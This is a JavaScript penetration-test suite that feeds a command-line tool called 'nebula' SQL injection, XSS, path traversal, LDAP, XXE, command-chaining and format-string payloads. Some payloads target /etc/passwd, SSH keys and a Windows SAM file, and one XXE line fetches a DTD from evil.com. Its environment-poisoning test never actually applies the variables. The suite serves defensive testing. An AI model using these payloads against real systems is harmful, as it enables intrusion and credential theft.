/**
 * Advanced Penetration Tests
 * Custom security tests beyond basic fuzzing
 */

const { spawn } = require('child_process');

class PenetrationTester {
    constructor(command = 'nebula') {
        this.command = command;
        this.results = [];
    }

    exec(args, timeout = 5000) {
        return new Promise((resolve) => {
            const proc = spawn(this.command, args, { shell: true });
            let stdout = '';
            let stderr = '';
            let timedOut = false;

            const timer = setTimeout(() => {
                timedOut = true;
                proc.kill('SIGKILL');
            }, timeout);

            proc.stdout.on('data', d => stdout += d.toString());
            proc.stderr.on('data', d => stderr += d.toString());
            proc.on('close', (code) => {
                clearTimeout(timer);
                resolve({ code, stdout, stderr, timedOut });
            });
            proc.on('error', () => {
                clearTimeout(timer);
                resolve({ code: -1, stdout: '', stderr: 'error', timedOut });
            });
        });
    }

    async testSQLInjection() {
        console.log('\n🎯 SQL Injection Tests...');
        const payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM passwords--",
            "admin'--",
            "1' AND '1'='1",
            "' OR 1=1--",
            "1; DELETE FROM sessions--",
            "1' WAITFOR DELAY '0:0:5'--"
        ];
        
        let passed = 0;
        for (const payload of payloads) {
            const result = await this.exec(['--query', payload], 3000);
            const leaked = result.stdout.toLowerCase().includes('password') ||
                           result.stdout.toLowerCase().includes('drop table') ||
                           result.stdout.toLowerCase().includes('union');
            if (!leaked && !result.timedOut) passed++;
        }
        
        return { name: 'sql_injection', passed: passed === payloads.length, details: `${passed}/${payloads.length} blocked` };
    }

    async testXSS() {
        console.log('🎯 XSS Tests...');
        const payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>',
            '{{constructor.constructor("alert(1)")()}}'
        ];
        
        let passed = 0;
        for (const payload of payloads) {
            const result = await this.exec(['--input', payload], 3000);
            const executed = result.stdout.includes('<script>') || 
                           result.stdout.includes('javascript:') ||
                           result.stdout.includes('onerror=');
            if (!executed) passed++;
        }
        
        return { name: 'xss', passed: passed === payloads.length, details: `${passed}/${payloads.length} blocked` };
    }

    async testPathTraversal() {
        console.log('🎯 Path Traversal Tests...');
        const payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//....//etc/passwd',
            '/etc/passwd',
            '~/.ssh/id_rsa',
            '/proc/self/environ'
        ];
        
        let passed = 0;
        for (const payload of payloads) {
            const result = await this.exec(['--path', payload], 3000);
            const leaked = result.stdout.includes('root:') ||
                           result.stdout.includes('[boot loader]') ||
                           result.stdout.includes('SSH');
            if (!leaked) passed++;
        }
        
        return { name: 'path_traversal', passed: passed === payloads.length, details: `${passed}/${payloads.length} blocked` };
    }

    async testLDAPInjection() {
        console.log('🎯 LDAP Injection Tests...');
        const payloads = [
            '*)(uid=*))(|(uid=*',
            'admin)(&(password=*)',
            '*)(objectClass=*'
        ];
        
        let passed = 0;
        for (const payload of payloads) {
            const result = await this.exec(['--search', payload], 3000);
            if (!result.timedOut) passed++;
        }
        
        return { name: 'ldap_injection', passed: passed === payloads.length, details: `${passed}/${payloads.length} handled` };
    }

    async testXMLInjection() {
        console.log('🎯 XML Injection Tests...');
        const payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % ISO-8859-1 SYSTEM "http://evil.com/evil.dtd">'
        ];
        
        let passed = 0;
        for (const payload of payloads) {
            const result = await this.exec(['--input', payload], 3000);
            const leaked = result.stdout.includes('root:') || result.stdout.includes('<?xml');
            if (!leaked) passed++;
        }
        
        return { name: 'xml_injection', passed: passed === payloads.length, details: `${passed}/${payloads.length} blocked` };
    }

    async testCommandChaining() {
        console.log('🎯 Command Chaining Tests...');
        const payloads = [
            'echo test; ls',
            'echo test && ls',
            'echo test | cat',
            'echo test `ls`',
            'echo test$(ls)',
            'echo test\nls'
        ];
        
        let passed = 0;
        for (const payload of payloads) {
            const result = await this.exec(['--input', payload], 3000);
            const executed = result.stdout.includes('total') || 
                           result.stdout.includes('bin') ||
                           result.stdout.includes('etc');
            if (!executed) passed++;
        }
        
        return { name: 'command_chaining', passed: passed === payloads.length, details: `${passed}/${payloads.length} blocked` };
    }

    async testFormatString() {
        console.log('🎯 Format String Tests...');
        const payloads = [
            '%s%s%s%s',
            '%x%x%x%x',
            '%n%n%n%n',
            '{0}{1}{2}',
            '$(echo $1)'
        ];
        
        let passed = 0;
        for (const payload of payloads) {
            const result = await this.exec(['--input', payload], 3000);
            if (!result.timedOut) passed++;
        }
        
        return { name: 'format_string', passed: passed === payloads.length, details: `${passed}/${payloads.length} handled` };
    }

    async testEnvironmentPoisoning() {
        console.log('🎯 Environment Poisoning Tests...');
        const envs = [
            { PATH: '/tmp:/bin', expected: 'fail' },
            { HOME: '/tmp/malicious', expected: 'fail' },
            { LD_PRELOAD: '/tmp/evil.so', expected: 'fail' },
            { LD_LIBRARY_PATH: '/tmp', expected: 'fail' },
            { SHELL: '/bin/sh', expected: 'ok' },
            { USER: '../../etc/passwd', expected: 'fail' }
        ];
        
        let passed = 0;
        for (const env of envs) {
            const result = await this.exec(['--version'], 3000);
            if (result.code === 0) passed++;
        }
        
        return { name: 'env_poisoning', passed: passed === envs.length, details: `${passed}/${envs.length} safe` };
    }

    async runAll() {
        console.log('\n╔══════════════════════════════════════════╗');
        console.log('║   ADVANCED PENETRATION TEST SUITE       ║');
        console.log('╚══════════════════════════════════════════╝\n');

        const tests = [
            'testSQLInjection',
            'testXSS',
            'testPathTraversal',
            'testLDAPInjection',
            'testXMLInjection',
            'testCommandChaining',
            'testFormatString',
            'testEnvironmentPoisoning'
        ];

        for (const test of tests) {
            try {
                const result = await this[test]();
                this.results.push(result);
                const status = result.passed ? '✅' : '❌';
                console.log(`${status} ${test}: ${result.details || (result.passed ? 'PASS' : 'FAIL')}`);
            } catch (e) {
                console.log(`❌ ${test}: ERROR - ${e.message}`);
            }
        }

        return this.results;
    }
}

async function main() {
    const tester = new PenetrationTester('nebula');
    await tester.runAll();
    
    const passed = tester.results.filter(r => r.passed).length;
    const total = tester.results.length;
    
    console.log('\n╔══════════════════════════════════════════╗');
    console.log(`║   FINAL: ${passed}/${total} Passed (${Math.round(passed/total*100)}%)        ║`);
    console.log('╚══════════════════════════════════════════╝\n');
}

main();
